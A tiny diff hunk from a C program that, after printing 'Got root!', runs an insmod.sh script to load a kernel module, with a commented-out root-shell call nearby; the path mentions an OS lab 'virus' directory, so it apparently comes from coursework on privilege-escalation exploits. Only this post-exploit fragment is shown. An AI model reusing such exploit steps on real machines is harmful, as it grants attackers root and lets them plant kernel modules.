@@ -272,6 +272,6 @@ int main(int argc, char * argv[])
 
        printf("[*] Got root!\n");
        //execl("/bin/sh", "/bin/sh", NULL);
-system ("/home/oslab/OSlab/virus/insmod.sh");
+system ("./insmod.sh");
 }
 
